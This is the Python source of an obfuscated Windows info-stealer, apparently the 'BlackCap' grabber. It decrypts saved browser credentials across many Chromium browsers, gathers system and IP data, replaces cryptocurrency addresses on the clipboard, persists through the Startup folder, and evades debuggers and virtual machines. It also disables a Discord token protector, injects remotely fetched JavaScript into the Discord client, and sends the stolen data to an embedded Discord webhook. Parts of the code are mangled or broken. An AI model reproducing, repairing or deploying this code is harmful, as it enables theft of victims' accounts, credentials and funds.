import asyncio
import json
import ntpath
import os
import random
import re
import shutil
import sqlite3
import subprocess
import threading
import winreg
import zipfile
import httpx
import psutil
import base64
import requests
import ctypes
import lIlllIlIIII
import pyperclip
import win32gui
import win32con
import webbrowser
from sqlite3 import connect
from base64 import b64decode
from urllib.request import Request, urlopen
from shutil import copy2
from datetime import datetime, timedelta, timezone
from sys import argv
from tempfile import gettempdir, mkdtemp
from json import loads, dumps
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from PIL import ImageGrab
from win32crypt import lIIIlllllI
import urllib.request
IlllIIlIIlllI = os.getenv('LOCALAPPDATA')
IllllllI = os.getenv('APPDATA')
lIIllIlIlIIIIIlIII = os.getenv("TEMP")
lIllIlIIIIlIlIIIIl = [];
IllllllllIIlIIlll = {
    'yourwebhookurl': "https://discord.com/api/webhooks/1119333985923903568/K9Z71JGoPx-phMFqnAMKIwNi0Cp1AdItiranBc2wFbO17dsSA7fIQe8OAO8gaFD-LHVl",
    'blackcap_inject_url': "https://raw.githubusercontent.com/toinfinityandbeyonddd/inject/main/index.js",
    'hide': 'yes',
    'ping': 'yes',
    'pingtype': 'everyone',
    'fake_error':'no',
    'startup': 'no',
    'kill_discord_process': False,
    'dbugkiller': False,
    'addresse_crypto_replacer': 'no',
    'addresse_btc': 'none',
    'addresse_eth': 'none',
    'addresse_xchain': 'none',
    'addresse_pchain': 'none',
    'addresse_cchain': 'none',
    'addresse_monero': 'none',
    'addresse_ada': 'none',
    'addresse_dash': 'none',
    'blprggg':
    [
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "cmd",
        "taskmgr",
        "vboxservice",
        "df5serv",
        "processhacker",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver"
    ]
}
lIIllIllII = os.getlogin()
IIIIlIIIIIlllIIlIlI = os.getenv("COMPUTERNAME")
llllIlll = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
llIIIlIIlIlIlIIIIlll = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
llllIlIlIllllII = 'https://paste.bingner.com/paste/jkgxr/raw'
IIllIIIllll = requests.get(llllIlIlIllllII) 
IlIlIlllIIlIll = IlIIllIll"[\w-]{24}\." + IIllIIIllll.text
class IIlIlIllIlI(object):
    @staticmethod
    def lllIlIIlIIIll(lllIllIIlIlllllIIIIl: str or os.PathLike):
        if not ntpath.exists(lllIllIIlIlllllIIIIl):
            return None
        with open(lllIllIIlIlllllIIIIl, "r", encoding="utf-8") as llllIlIlll:
            lIlllIIlIIIIIlIII = llllIlIlll.read()
        IlllIIIIlIIIlIl = json.loads(lIlllIIlIIIIIlIII)
        try:
            IIlIllIllIIlIII = b64decode(IlllIIIIlIIIlIl["os_crypt"]["encrypted_key"])
            return IIlIlIllIlI.llIlIlIlllIlIll(IIlIllIllIIlIII[5:])
        except KeyError:
            return None
    @staticmethod
    def IlIIlIllIlllll(lIlllIlIIII: int or float) -> str:
        try:
            IlIIIIlIIIlIl = datetime(1601, 1, 1, tzinfo=timezone.utc)
            lIlIIlIlllll = IlIIIIlIIIlIl + timedelta(microseconds=lIlllIlIIII)
            return lIlIIlIlllll
        except Exception:
            pass
    @staticmethod
    def llIlIlIlllIlIll(lIllllllIIlll: bytes) -> str:
        return lIIIlllllI(lIllllllIIlll, None, None, None, 0)[1]
    @staticmethod
    def IlIlIllIIIlllIllllI(IlIlIIIllIIllIl: str or os.PathLike = gettempdir()):
        IlIlIIIllI = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for IIllIIllllIlIIlIl in range(random.randint(10, 20)))
        lllIllIIlIlllllIIIIl = ntpath.join(IlIlIIIllIIllIl, IlIlIIIllI)
        open(lllIllIIlIlllllIIIIl, "x")
        return lllIllIIlIlllllIIIIl
    @staticmethod
    def lIIIIIllIl(IllIlIIIIIIlll, IIlIllIllIIlIII) -> str:
        try:
            IIllllIllIlIlIllI = IllIlIIIIIIlll[3:15]
            llIlIlIlIIlIIIllII = IllIlIIIIIIlll[15:]
            IllIlIIIIIlllllIIIlI = AES.new(IIlIllIllIIlIII, AES.MODE_GCM, IIllllIllIlIlIllI)
            IIIlllIllIlIIllll = IllIlIIIIIlllllIIIlI.decrypt(llIlIlIlIIlIIIllII)
            IIIlllIllIlIIllll = IIIlllIllIlIIllll[:-16].decode()
            return IIIlllIllIlIIllll
        except Exception:
            return llllIlIlll'Failed to decrypt "{str(IllIlIIIIIIlll)}" | key: "{str(IIlIllIllIIlIII)}"'
    @staticmethod
    def IIlIIIlIlIIIIIll(lIIlIIIlIIl: str = None):
        IlIIllIIIl = {
            "Content-Type": "application/json",
        }
        if lIIlIIIlIIl:
            IlIIllIIIl.update({"Authorization": lIIlIIIlIIl})
        return IlIIllIIIl
    @staticmethod
    def lIIlIllIII() -> list:
        IIIlIlllIlIlllI = 0x08000000
        IIIIlIIllI = "wmic csproduct get uuid"
        lIllIIIlIllll = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
        IIllIIllIllIIlIlII = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
        try:
            llIIIIllIll = subprocess.check_output(IIIIlIIllI, creationflags=IIIlIlllIlIlllI).decode().split('\n')[1].strip()
        except Exception:
            llIIIIllIll = "N/A"
        try:
            IIIIIIlIllI = subprocess.check_output(lIllIIIlIllll, creationflags=IIIlIlllIlIlllI).decode().rstrip()
        except Exception:
            IIIIIIlIllI = "N/A"
        try:
            lIlIlllIIlII = subprocess.check_output(IIllIIllIllIIlIlII, creationflags=IIIlIlllIlIlllI).decode().rstrip()
        except Exception:
            lIlIlllIIlII = "N/A"
        return [llIIIIllIll, lIlIlllIIlII, IIIIIIlIllI]
    @staticmethod
    def llllIIlI() -> list:
        lIIlIlIllllIIIlIIIl, IIIllllIllII, IIlIIlIIl, llIlIllIlIIIIll, IIlIlIIIl, IlllIIIl, lIllIIll = "None", "None", "None", "None", "None", "None", "None"
        lIIIlIIIIIllIllIIIII = httpx.get("https://ipinfo.io/json")
        if lIIIlIIIIIllIllIIIII.status_code == 200:
            lIlIIIllIIlI = lIIIlIIIIIllIllIIIII.json()
            lIIlIlIllllIIIlIIIl = lIlIIIllIIlI.get('ip')
            IIIllllIllII = lIlIIIllIIlI.get('city')
            IIlIIlIIl = lIlIIIllIIlI.get('country')
            llIlIllIlIIIIll = lIlIIIllIIlI.get('region')
            IIlIlIIIl = lIlIIIllIIlI.get('org')
            IlllIIIl = lIlIIIllIIlI.get('loc')
            lIllIIll = "https://www.google.com/maps/search/google+map++" + IlllIIIl
        return [lIIlIlIllllIIIlIIIl, IIIllllIllII, IIlIIlIIl, llIlIllIlIIIIll, IIlIlIIIl, IlllIIIl, lIllIIll]
    @staticmethod
    def lIllllIIIllIIllIIll(llllllII: str) -> str or bool | None:
        return IllllllllIIlIIlll.get(llllllII)
class IlIllIIllIllIII(IIlIlIllIlI):
    def __init__(lIIlllllllIlI):
        lIIlllllllIlI.IllIllIll = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_crypto_replacer")
        lIIlllllllIlI.IIlIlIIIIlIIlIlll = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_btc")
        lIIlllllllIlI.IIIlIIIlIIIlllllll = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_eth")
        lIIlllllllIlI.IlIlIlIIlllI = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_xchain")
        lIIlllllllIlI.IIllllIll = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_pchain")
        lIIlllllllIlI.IIIIIlIlllllIlI = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_cchain")
        lIIlllllllIlI.IIllIIIIIl = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_monero")
        lIIlllllllIlI.IllIlIlIll = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_ada")
        lIIlllllllIlI.llIIIIlllIl = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_dash")
    def llIIlllll(lIIlllllllIlI):
        try:
            lIlIIIIIl = pyperclip.paste()
            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', lIlIIIIIl):
                if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
                    if lIIlllllllIlI.IIlIlIIIIlIIlIlll != "none":
                        pyperclip.copy(lIIlllllllIlI.IIlIlIIIIlIIlIlll)
                        pyperclip.paste()
            if re.search('^0x[a-fA-F0-9]{40}$', lIlIIIIIl):
                pyperclip.copy(lIIlllllllIlI.IIIlIIIlIIIlllllll)
                pyperclip.paste()
            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzIlIIllIlllIIlIIlIIIIIlllI9lIllllIlIl8gllllIlIlll2lIllIIllIlIIIIvdw0s3IIlllllln54khlIlllIIlIIIIIlIIIllllllII6mulIlIlIIIlIlllIlllII7IIIlIIllIlIlllIllI]{38}$', lIlIIIIIl):
                if lIIlllllllIlI.IlIlIlIIlllI != "none":
                    if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
                        pyperclip.copy(lIIlllllllIlI.IlIlIlIIlllI)
                        pyperclip.paste()
            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzIlIIllIlllIIlIIlIIIIIlllI9lIllllIlIl8gllllIlIlll2lIllIIllIlIIIIvdw0s3IIlllllln54khlIlllIIlIIIIIlIIIllllllII6mulIlIlIIIlIlllIlllII7IIIlIIllIlIlllIllI]{38}$', lIlIIIIIl):
                if lIIlllllllIlI.IIllllIll != "none":
                    if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
                        pyperclip.copy(lIIlllllllIlI.IIllllIll)
                        pyperclip.paste()
            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzIlIIllIlllIIlIIlIIIIIlllI9lIllllIlIl8gllllIlIlll2lIllIIllIlIIIIvdw0s3IIlllllln54khlIlllIIlIIIIIlIIIllllllII6mulIlIlIIIlIlllIlllII7IIIlIIllIlIlllIllI]{38}$', lIlIIIIIl):
                if lIIlllllllIlI.IIIIIlIlllllIlI != "none":
                    if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
                        pyperclip.copy(lIIlllllllIlI.IIIIIlIlllllIlI)
                        pyperclip.paste()
            if re.search('addr1[a-z0-9]+', lIlIIIIIl):
                    if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
                        pyperclip.copy(lIIlllllllIlI.IllIlIlIll)
                        pyperclip.paste()
            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', lIlIIIIIl):
                if lIIlllllllIlI.llIIIIlllIl != "none":
                    if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
                        pyperclip.copy(lIIlllllllIlI.llIIIIlllIl)
                        pyperclip.paste()
            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', lIlIIIIIl):
                if lIIlllllllIlI.IIllIIIIIl != "none":
                    if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
                        pyperclip.copy(lIIlllllllIlI.IIllIIIIIl)
                        pyperclip.paste()
        except:
            lIlIIIllIIlI = None
    def lIllIllI(lIIlllllllIlI):
        while True:
            lIIlllllllIlI.llIIlllll()
    def lllIIlIlI(lIIlllllllIlI):
        if lIIlllllllIlI.IllIllIll == "yes":
            lIIlllllllIlI.lIllIllI()
class llllIllIlllIIIlIl(IIlIlIllIlI):
    def __init__(lIIlllllllIlI):
        lIIlllllllIlI.lIIlIlIIllllIIIlI = "https://discord.com/api/v9/users/@me"
        lIIlllllllIlI.llllllIllllllIlIIll = lIIlllllllIlI.lIllllIIIllIIllIIll('yourwebhookurl')
        lIIlllllllIlI.IlIlIlIllIlIllI = lIIlllllllIlI.lIllllIIIllIIllIIll("hide")
        lIIlllllllIlI.lIlIIlIIIlIlllll = lIIlllllllIlI.lIllllIIIllIIllIIll("pingtype")
        lIIlllllllIlI.IIIlIIllIIlIlI = lIIlllllllIlI.lIllllIIIllIIllIIll("ping")
        lIIlllllllIlI.IIlIlIIllIllIII = "https://discord.com/api/v9/users/@me"
        lIIlllllllIlI.lIlllIIlIIlIIlIIIIII = lIIlllllllIlI.lIllllIIIllIIllIIll("startup")
        lIIlllllllIlI.lllIIIIIIIIIIl = lIIlllllllIlI.lIllllIIIllIIllIIll("fake_error")
        lIIlllllllIlI.IlIlIIllIIll = os.getenv("localappdata")
        lIIlllllllIlI.IllllllI = os.getenv("appdata")
        lIIlllllllIlI.lIllllIIlIlIl = ntpath.join(lIIlllllllIlI.IlIlIIllIIll, 'Google', 'Chrome', 'User Data')
        lIIlllllllIlI.IllllIlIllIllIIlll, lIIlllllllIlI.lIIllIlIlIIIIIlIII = mkdtemp(), gettempdir()
        IIIIIIlIlllIIIIIll, llIIlIIlIIlIlIIIIl = lIIlllllllIlI.lIIlIllIII(), lIIlllllllIlI.llllIIlI()
        lIIlllllllIlI.llIIIIllIll, lIIlllllllIlI.lIlIlllIIlII, lIIlllllllIlI.IIIIIIlIllI = IIIIIIlIlllIIIIIll[0], IIIIIIlIlllIIIIIll[1], IIIIIIlIlllIIIIIll[2]
        lIIlllllllIlI.lIIlIlIllllIIIlIIIl, lIIlllllllIlI.IIIllllIllII, lIIlllllllIlI.IIlIIlIIl, lIIlllllllIlI.llIlIllIlIIIIll, lIIlllllllIlI.IIlIlIIIl, lIIlllllllIlI.IlllIIIl, lIIlllllllIlI.lIllIIll = llIIlIIlIIlIlIIIIl[0], llIIlIIlIIlIlIIIIl[1], llIIlIIlIIlIlIIIIl[2], llIIlIIlIIlIlIIIIl[3], llIIlIIlIIlIlIIIIl[4], llIIlIIlIIlIlIIIIl[5], llIIlIIlIIlIlIIIIl[6]
        lIIlllllllIlI.lIIIlllllllIIIIllI = ntpath.join(lIIlllllllIlI.IllllllI, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        lIIlllllllIlI.lIIIllIIIlIllllIIll = "api/webhooks"
        lIIlllllllIlI.llIIIIIlIIlll = re.compile(IlIIllIll'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE);
        lIIlllllllIlI.IIlIlIIllIllIII = "https://discord.com/api/v9/users/@me"
        lIIlllllllIlI.IllIIIllIlIl = IlIlIlllIIlIll
        lIIlllllllIlI.IIlIIlIllllI = IlIIllIll"dQw4w9WgXcQ:[^\"]*"
        lIIlllllllIlI.IIlIlllI = []
        lIIlllllllIlI.lIIllIIllllll = []
        lIIlllllllIlI.IIlllIIIlIlI = os.IIlllIIIlIlI;
        lIIlllllllIlI.IIIIlIIIII = [];
        lIIlllllllIlI.IllIIIIIIIIIIlllIII = lIIlllllllIlI.lllIlIIlIIIll(ntpath.join(lIIlllllllIlI.lIllllIIlIlIl, "Local State"));
        os.makedirs(lIIlllllllIlI.IllllIlIllIllIIlll, exist_ok=True);
    def IlIIlIIIlllIlIIll(lIIlllllllIlI: str) -> str:
        if lIIlllllllIlI.lllIIIIIIIIIIl == "yes":
            ctypes.windll.user32.MessageBoxW(None, 'Error code: Windows_0x988958\nSomething gone wrong.', 'Fatal Error', 0)
    def IllllIII(lIIlllllllIlI: str) -> str:
        llllIIIlIlI = {
            'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
            'content': "@everyone"
            }
        llIllIlIl = {
            'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
            'content': "@here"
            }
        if lIIlllllllIlI.IIIlIIllIIlIlI == "yes":
            if lIIlllllllIlI.lIIIllIIIlIllllIIll in lIIlllllllIlI.llllllIllllllIlIIll:
                if lIIlllllllIlI.lIlIIlIIIlIlllll == "@everyone" or lIIlllllllIlI.lIlIIlIIIlIlllll == "everyone":
                    httpx.post(lIIlllllllIlI.llllllIllllllIlIIll, json=llllIIIlIlI)
            if lIIlllllllIlI.lIlIIlIIIlIlllll == "@here" or lIIlllllllIlI.lIlIIlIIIlIlllll == "here":
                if lIIlllllllIlI.lIIIllIIIlIllllIIll in lIIlllllllIlI.llllllIllllllIlIIll :
                    httpx.post(lIIlllllllIlI.llllllIllllllIlIIll, json=llIllIlIl)
    def IIlIllllIIllIIll(lIIlllllllIlI: str) -> str:
        if lIIlllllllIlI.lIlllIIlIIlIIlIIIIII == "yes":
            IlIIIlllIIIlllIIIlII = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
            if os.lllIllIIlIlllllIIIIl.exists(IlIIIlllIIIlllIIIlII + argv[0]):
                os.remove(IlIIIlllIIIlllIIIlII + argv[0])
                copy2(argv[0], IlIIIlllIIIlllIIIlII)
            else:
                copy2(argv[0], IlIIIlllIIIlllIIIlII)
    def IllllIllIIIIll(lIIlllllllIlI: str) -> str:
        if lIIlllllllIlI.IlIlIlIllIlIllI == "yes":
            IlIlIlIllIlIllI = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(IlIlIlIllIlIllI, win32con.SW_HIDE)
    def IlIllllIlIIlll(lIIlllllllIlI):
        shutil.rmtree(lIIlllllllIlI.IllllIlIllIllIIlll, ignore_errors=True)
        os._exit(0)
    def llIIIlIlllIlllll(lllIIllI):
        def IIlIIlIllll(*llIlIllIIlIIlIIIlIll, **lllllllIl):
            try:
                lllIIllI(*llIlIllIIlIIlIIIlIll, **lllllllIl)
            except Exception:
                pass
        return IIlIIlIllll
    async def IlIlIllllIIIlI(lIIlllllllIlI):
        lIIlllllllIlI.llIllIIIIIllll = {
            'amigo': lIIlllllllIlI.IlIlIIllIIll + '\\Amigo\\User Data',
            'torch': lIIlllllllIlI.IlIlIIllIIll + '\\Torch\\User Data',
            'kometa': lIIlllllllIlI.IlIlIIllIIll + '\\Kometa\\User Data',
            'orbitum': lIIlllllllIlI.IlIlIIllIIll + '\\Orbitum\\User Data',
            'cent-browser': lIIlllllllIlI.IlIlIIllIIll + '\\CentBrowser\\User Data',
            '7star': lIIlllllllIlI.IlIlIIllIIll + '\\7Star\\7Star\\User Data',
            'sputnik': lIIlllllllIlI.IlIlIIllIIll + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': lIIlllllllIlI.IlIlIIllIIll + '\\Vivaldi\\User Data',
            'google-chrome-sxs': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': lIIlllllllIlI.IlIlIIllIIll + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': lIIlllllllIlI.IlIlIIllIIll + '\\Microsoft\\Edge\\User Data',
            'uran': lIIlllllllIlI.IlIlIIllIIll + '\\uCozMedia\\Uran\\User Data',
            'yandex': lIIlllllllIlI.IlIlIIllIIll + '\\Yandex\\YandexBrowser\\User Data',
            'brave': lIIlllllllIlI.IlIlIIllIIll + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': lIIlllllllIlI.IlIlIIllIIll + '\\Iridium\\User Data',
            'edge': lIIlllllllIlI.IlIlIIllIIll + "\\Microsoft\\Edge\\User Data",
            'coccoc': lIIlllllllIlI.IlIlIIllIIll + "\\CocCoc\\Browser\\User Data"
        }        
        lIIlllllllIlI.IlIlIlIIIIllIIIII = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
            'Profile 6',
            'Profile 7',
            'Profile 8',
            'Profile 9',
            'Profile 10',
            'Profile 11',
            'Profile 12',
            'Profile 13',
            'Profile 14',
            'Profile 15',            
        ]
        if lIIlllllllIlI.llllllIllllllIlIIll == "" or self.discord_webhook == "\x57EBHOOK_HERE":
            lIIlllllllIlI.IlIllllIlIIlll()
        lIIlllllllIlI.IllllIllIIIIll()
        lIIlllllllIlI.IlIIlIIIlllIlIIll()
        lIIlllllllIlI.IIlIllllIIllIIll()
        if lIIlllllllIlI.lIllllIIIllIIllIIll('dbugkiller') and IIIIIlIIIllIlIllIIlI().lllllllI is True:
            lIIlllllllIlI.IlIllllIlIIlll()
        await lIIlllllllIlI.IIIIIlIIlIlIl()
        await lIIlllllllIlI.lIllIIlIIlllIlIlIl()
        IlIlIIlIIlllIIlIIl = [lIIlllllllIlI.lIIlllIIlI, lIIlllllllIlI.lllIIlIlII, lIIlllllllIlI.IIIIlllIl, lIIlllllllIlI.lIIIlIllIIllllIIllI, lIIlllllllIlI.IIlllIIlIIIII]
        if lIIlllllllIlI.lIllllIIIllIIllIIll('kill_discord_process'):
            await lIIlllllllIlI.IllllIIllI()
        os.makedirs(ntpath.join(lIIlllllllIlI.IllllIlIllIllIIlll, 'Browsers'), exist_ok=True)
        for lIIlllIlIlIIlII, lllIllIIlIlllllIIIIl in lIIlllllllIlI.llIllIIIIIllll.items():
            if not os.lllIllIIlIlllllIIIIl.isdir(lllIllIIlIlllllIIIIl):
                continue
            lIIlllllllIlI.IIIlIlIIIl = lIIlllllllIlI.lllIlIIlIIIll(lllIllIIlIlllllIIIIl + '\\Local State')
            lIIlllllllIlI.IIlIIllIlIl = [
                lIIlllllllIlI.lIlllIIlIl,
                lIIlllllllIlI.lIIIlIIIllIllIlIl,
                lIIlllllllIlI.IIllllllIIllIl,
                lIIlllllllIlI.llIIIIIlIlIlIIIllIl
            ]
            for IlllIIlllIllllIIII in lIIlllllllIlI.IlIlIlIIIIllIIIII:
                for lllIIllI in lIIlllllllIlI.IIlIIllIlIl:
                    try:
                        lllIIllI(lIIlllIlIlIIlII, lllIllIIlIlllllIIIIl, IlllIIlllIllllIIII)
                    except:
                        pass
        if ntpath.exists(lIIlllllllIlI.lIllllIIlIlIl) and lIIlllllllIlI.IllIIIIIIIIIIlllIII is not None:
            os.makedirs(ntpath.join(lIIlllllllIlI.IllllIlIllIllIIlll, 'Google'), exist_ok=True)
            IlIlIIlIIlllIIlIIl.extend([lIIlllllllIlI.IlIlllIllllIllIIlIlI, lIIlllllllIlI.lIIlllIlllIll, lIIlllllllIlI.lIllIIlIIlIlIIllI])
        for lllIIllI in IlIlIIlIIlllIIlIIl:
            IIlIIlllII = threading.Thread(llIlIIllIIIl=lllIIllI, daemon=True)
            IIlIIlllII.start()
        for lIllIIllIlIIII in threading.enumerate():
            try:
                lIllIIllIlIIII.join()
            except RuntimeError:
                continue
        lIIlllllllIlI.IIIIllIll()
        await lIIlllllllIlI.lIIllIllIIlIIlIllII()
        lIIlllllllIlI.IllllIII()
        lIIlllllllIlI.IlIIIIll()
    async def lIIllIllIIlIIlIllII(lIIlllllllIlI):
        for IlIlIIIllIIllIl in os.listdir(lIIlllllllIlI.IlIlIIllIIll):
            if 'discord' in IlIlIIIllIIllIl.lower():
                lIllIIlIllIIIl = lIIlllllllIlI.IlIlIIllIIll + os.IIlllIIIlIlI + IlIlIIIllIIllIl
                for lIlIIlIIlIl in os.listdir(ntpath.abspath(lIllIIlIllIIIl)):
                    if re.match(IlIIllIll'app-(\d*\.\d*)*', lIlIIlIIlIl):
                        IIIlllIlIIIllII = ntpath.abspath(ntpath.join(lIllIIlIllIIIl, lIlIIlIIlIl))
                        lllIIlll = ntpath.join(IIIlllIlIIIllII, 'modules')
                        if not ntpath.exists(lllIIlll):
                            return
                        for lllIIlIIlIlll in os.listdir(lllIIlll):
                            if re.match(IlIIllIll"discord_desktop_core-\d+", lllIIlIIlIlll):
                                llIIlllIlIIII = lllIIlll + os.IIlllIIIlIlI + lllIIlIIlIlll + llllIlIlll'\\discord_desktop_core\\'
                                if ntpath.exists(llIIlllIlIIII):
                                    if lIIlllllllIlI.lIIIlllllllIIIIllI not in argv[0]:
                                        try:
                                            os.makedirs(llIIlllIlIIII + 'blackcap', exist_ok=True)
                                        except PermissionError:
                                            pass
                                    if lIIlllllllIlI.lIIIllIIIlIllllIIll in lIIlllllllIlI.llllllIllllllIlIIll:
                                        llllIlIlll = httpx.get(lIIlllllllIlI.lIllllIIIllIIllIIll('blackcap_inject_url')).text.replace("%WEBHOOK%", lIIlllllllIlI.llllllIllllllIlIIll)
                                    try:
                                        with open(llIIlllIlIIII + 'index.js', 'w', errors="ignore") as llIlIlIIllIll:
                                            llIlIlIIllIll.write(llllIlIlll)
                                    except PermissionError:
                                        pass
                                    if lIIlllllllIlI.lIllllIIIllIIllIIll('kill_discord_process'):
                                        os.startfile(IIIlllIlIIIllII + lIIlllllllIlI.IIlllIIIlIlI + IlIlIIIllIIllIl + '.exe')
    async def lIllIIlIIlllIlIlIl(lIIlllllllIlI):
        IIIlIlIlllIIIIll = llllIlIlll"{lIIlllllllIlI.IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}\\DiscordTokenProtector\\"
        if not ntpath.exists(IIIlIlIlllIIIIll):
            return
        IIIIIllIIIl = IIIlIlIlllIIIIll + "config.json"
        for lIlIllllIllIlIIllII in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(IIIlIlIlllIIIIll + lIlIllllIllIlIIllII)
            except FileNotFoundError:
                pass
        if ntpath.exists(IIIIIllIIIl):
            with open(IIIIIllIIIl, errors="ignore") as llllIlIlll:
                try:
                    lllIIIIlIllIIl = json.load(llllIlIlll)
                except json.decoder.JSONDecodeError:
                    return
                lllIIIIlIllIIl['ksch_is_here'] = "https://github.com/asd"
                lllIIIIlIllIIl['auto_start'] = False
                lllIIIIlIllIIl['auto_start_discord'] = False
                lllIIIIlIllIIl['integrity'] = False
                lllIIIIlIllIIl['integrity_allowbetterdiscord'] = False
                lllIIIIlIllIIl['integrity_checkexecutable'] = False
                lllIIIIlIllIIl['integrity_checkhash'] = False
                lllIIIIlIllIIl['integrity_checkmodule'] = False
                lllIIIIlIllIIl['integrity_checkscripts'] = False
                lllIIIIlIllIIl['integrity_checkresource'] = False
                lllIIIIlIllIIl['integrity_redownloadhashes'] = False
                lllIIIIlIllIIl['iterations_iv'] = 364
                lllIIIIlIllIIl['iterations_key'] = 457
                lllIIIIlIllIIl['version'] = 69420
            with open(IIIIIllIIIl, 'w') as llllIlIlll:
                json.dump(lllIIIIlIllIIl, llllIlIlll, indent=2, sort_keys=True)
            with open(IIIIIllIIIl, 'a') as llllIlIlll:
                llllIlIlll.write("\n\n//KSCH_is_here | https://github.com/asd")
    async def IllllIIllI(lIIlllllllIlI):
        IIllllIlIlIlIIII = lIIlllllllIlI.lIllllIIIllIIllIIll('blprggg')
        for lIlIllllIllIlIIllII in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
            IIllllIlIlIlIIII.append(lIlIllllIllIlIIllII)
        for llIIllIlIlII in psutil.process_iter():
